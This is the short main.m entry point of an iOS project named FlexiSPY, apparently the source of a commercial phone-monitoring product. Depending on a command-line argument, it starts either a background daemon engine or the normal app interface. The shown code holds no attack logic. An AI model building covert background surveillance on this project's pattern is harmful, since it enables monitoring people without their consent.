//
//  main.m
//  FlexiSPY
//
//  Created by Dominique  Mayrand on 12/1/11.
//  Copyright __MyCompanyName__ 2011. All rights reserved.
//

#import <UIKit/UIKit.h>

#import "AppEngine.h"

static NSString *kDaemonParam = @"ssmp-load-daemon";

int main(int argc, char *argv[]) {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
    int retVal = 0;
	
	// Get parameter
	NSString *param = [NSString string];
	if (argc > 1) {
		param = [NSString stringWithCString:argv[1] encoding:NSUTF8StringEncoding];
	}
	DLog(@"param=%@", param)
	// Check parameter
	if ([param isEqualToString:kDaemonParam]) {
		// Start as daemon
		AppEngine *appEngine = [[AppEngine alloc] init];
		CFRunLoopRun();
		[appEngine release];
	} else {
		// Start as UI
		retVal = UIApplicationMain(argc, argv, nil, nil);
	}
	
    [pool release];
    return retVal;
}
